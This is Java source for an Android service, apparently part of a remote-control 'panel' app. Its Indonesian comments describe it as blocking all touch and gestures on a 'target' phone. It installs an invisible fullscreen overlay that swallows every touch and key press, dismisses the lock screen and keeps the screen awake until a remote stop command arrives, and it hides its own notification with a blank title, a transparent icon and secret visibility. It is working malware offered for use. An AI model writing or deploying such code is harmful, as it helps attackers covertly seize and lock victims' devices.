package com.nex.panel;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.MotionEvent;
import android.view.View;
import android.view.WindowManager;

import androidx.core.app.NotificationCompat;

/**
 * TouchBlockerService — Blokir semua sentuhan & gesture di HP target.
 * Overlay transparan fullscreen yang menelan semua event touch.
 * HP tidak bisa disentuh sama sekali sampai STOP_BLOCK dikirim.
 */
public class TouchBlockerService extends Service {

    private static final String TAG     = "TouchBlockerService";
    private static final String CHANNEL = "nex_touch_blocker";
    private static final int    NOTIF_ID = 9993;

    public static final String ACTION_BLOCK_TOUCH = "com.nex.panel.ACTION_BLOCK_TOUCH";
    public static final String ACTION_STOP_BLOCK  = "com.nex.panel.ACTION_STOP_BLOCK";

    private WindowManager   wm;
    private View            overlayView;
    private PowerManager.WakeLock wakeLock;
    private final Handler uiHandler = new Handler(Looper.getMainLooper());

    @Override
    public void onCreate() {
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, buildNotification());
        wm = (WindowManager) getSystemService(WINDOW_SERVICE);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent == null) return START_STICKY;
        String action = intent.getAction();
        if (ACTION_BLOCK_TOUCH.equals(action)) {
            uiHandler.post(this::showBlockerOverlay);
        } else if (ACTION_STOP_BLOCK.equals(action)) {
            uiHandler.post(this::removeBlockerOverlay);
        }
        return START_STICKY;
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ── Tampilkan overlay transparan fullscreen yang blokir semua touch ──
    private void showBlockerOverlay() {
        try {
            removeBlockerOverlay(); // hapus dulu kalau ada

            // View transparan — tidak terlihat tapi menelan semua touch event
            View blocker = new View(this) {
                @Override
                public boolean onTouchEvent(MotionEvent event) {
                    // Telan semua touch event — tidak ada yang lolos ke bawah
                    return true;
                }

                @Override
                public boolean onKeyPreIme(int keyCode, KeyEvent event) {
                    // Blokir semua tombol hardware
                    return true;
                }
            };

            // Warna transparan — tidak terlihat user
            blocker.setBackgroundColor(Color.TRANSPARENT);
            blocker.setFocusable(true);
            blocker.setFocusableInTouchMode(true);
            blocker.setClickable(true);
            blocker.setLongClickable(true);

            // Blokir key hardware
            blocker.setOnKeyListener((v, keyCode, event) ->
                keyCode == KeyEvent.KEYCODE_BACK        ||
                keyCode == KeyEvent.KEYCODE_HOME        ||
                keyCode == KeyEvent.KEYCODE_APP_SWITCH  ||
                keyCode == KeyEvent.KEYCODE_MENU        ||
                keyCode == KeyEvent.KEYCODE_VOLUME_UP   ||
                keyCode == KeyEvent.KEYCODE_VOLUME_DOWN
            );

            overlayView = blocker;

            int type = Build.VERSION.SDK_INT >= Build.VERSION_CODES.O
                ? WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                : WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY;

            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                type,
                // TANPA FLAG_NOT_TOUCH_MODAL → overlay benar-benar modal
                // semua touch diserap, tidak ada yang lolos ke window lain
                WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN  |
                WindowManager.LayoutParams.FLAG_FULLSCREEN         |
                WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED   |
                WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD   |
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON     |
                WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.TOP | Gravity.START;

            wm.addView(overlayView, params);
            acquireWakeLock();
            Log.d(TAG, "Touch blocker overlay aktif");

        } catch (Exception e) {
            Log.e(TAG, "showBlockerOverlay error: " + e.getMessage());
        }
    }

    // ── Hapus overlay — HP kembali normal ────────────────────────────────
    private void removeBlockerOverlay() {
        try {
            if (overlayView != null && wm != null) {
                try { wm.removeView(overlayView); } catch (Exception ignored) {}
                overlayView = null;
            }
            releaseWakeLock();
            Log.d(TAG, "Touch blocker dihapus — HP normal");
        } catch (Exception e) {
            Log.e(TAG, "removeBlockerOverlay error: " + e.getMessage());
        }
    }

    // ── WakeLock — layar tetap nyala selama diblokir ─────────────────────
    private void acquireWakeLock() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && (wakeLock == null || !wakeLock.isHeld())) {
                wakeLock = pm.newWakeLock(
                    PowerManager.SCREEN_BRIGHT_WAKE_LOCK |
                    PowerManager.ACQUIRE_CAUSES_WAKEUP,
                    "NexPanel:TouchBlocker"
                );
                wakeLock.acquire(60 * 60 * 1000L); // max 60 menit
            }
        } catch (Exception ignored) {}
    }

    private void releaseWakeLock() {
        try {
            if (wakeLock != null && wakeLock.isHeld()) {
                wakeLock.release();
                wakeLock = null;
            }
        } catch (Exception ignored) {}
    }

    @Override
    public void onDestroy() {
        uiHandler.post(this::removeBlockerOverlay);
        super.onDestroy();
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                NotificationChannel ch = new NotificationChannel(
                    CHANNEL, "Touch Blocker", NotificationManager.IMPORTANCE_NONE);
                ch.setSound(null, null);
                ch.setShowBadge(false);
                ch.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
                NotificationManager nm = getSystemService(NotificationManager.class);
                if (nm != null) nm.createNotificationChannel(ch);
            } catch (Exception e) {
                Log.e(TAG, "createNotificationChannel error: " + e.getMessage());
            }
        }
    }

    private Notification buildNotification() {
        return new NotificationCompat.Builder(this, CHANNEL)
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(R.drawable.ic_transparent)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setSilent(true)
            .setOngoing(false)
            .build();
    }
}
